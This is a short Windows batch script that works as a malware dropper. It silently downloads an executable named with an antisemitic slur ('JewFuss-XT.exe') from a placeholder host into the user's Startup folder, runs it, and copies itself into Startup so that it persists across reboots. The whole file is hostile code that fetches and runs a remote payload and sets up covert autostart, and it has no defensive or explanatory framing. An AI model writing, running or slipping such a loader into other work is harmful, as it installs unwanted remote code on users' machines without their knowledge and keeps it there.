@echo off
setlocal
set "url=https://example.com/JewFuss-XT.exe"
set "download_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\app.exe"
set "script_path=%~dp0%~nx0"
curl -o "%download_path%" "%url%" 2>nul
if not exist "%download_path%" (exit /b 1)
"%download_path%"
move "%script_path%" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
endlocal
cls